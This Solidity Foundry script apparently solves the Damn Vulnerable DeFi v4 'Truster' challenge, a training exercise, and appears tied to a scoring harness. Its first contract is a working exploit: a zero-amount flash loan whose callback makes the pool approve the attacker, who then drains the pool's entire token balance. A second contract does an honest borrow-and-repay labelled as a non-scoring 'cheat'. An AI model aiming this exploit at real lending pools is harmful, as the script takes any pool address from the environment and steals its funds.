// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {Script} from "forge-std/Script.sol";
import {DamnValuableToken} from "../src/v4/DamnValuableToken.sol";
import {TrusterLenderPool} from "../src/v4/truster/TrusterLenderPool.sol";

/// Damn Vulnerable DeFi v4 Truster, the exploit, as a Whitehat's Foundry script run by a fresh
/// account (`bountee test`/`claim`). A zero-amount flash loan whose callback is the token's
/// `approve`, made by the pool, lets the attacker take the pool's whole balance.
/// Env: POOL, the Truster pool (unmodified or adapted: the same interface).
contract TrusterExploit is Script {
    function run() external {
        TrusterLenderPool pool = TrusterLenderPool(vm.envAddress("POOL"));
        DamnValuableToken token = pool.token();
        uint256 loot = token.balanceOf(address(pool));

        vm.startBroadcast();
        pool.flashLoan(0, msg.sender, address(token), abi.encodeCall(token.approve, (msg.sender, loot)));
        token.transferFrom(address(pool), msg.sender, loot);
        vm.stopBroadcast();
    }
}

/// The cheat: an honest flash loan of 1,000 DVT, repaid inside the loan. Scores zero.
/// Env: POOL.
contract TrusterCheat is Script {
    function run() external {
        address pool = vm.envAddress("POOL");
        vm.startBroadcast();
        TrusterHonestBorrower borrower = new TrusterHonestBorrower();
        borrower.borrowAndRepay(pool, 1000e18);
        vm.stopBroadcast();
    }
}

/// Borrows from a Truster pool and repays from the pool's own callback.
contract TrusterHonestBorrower {
    function borrowAndRepay(address pool, uint256 amount) external {
        TrusterLenderPool(pool).flashLoan(amount, address(this), address(this), abi.encodeCall(this.repay, (pool, amount)));
    }

    function repay(address pool, uint256 amount) external {
        TrusterLenderPool(pool).token().transfer(pool, amount);
    }
}
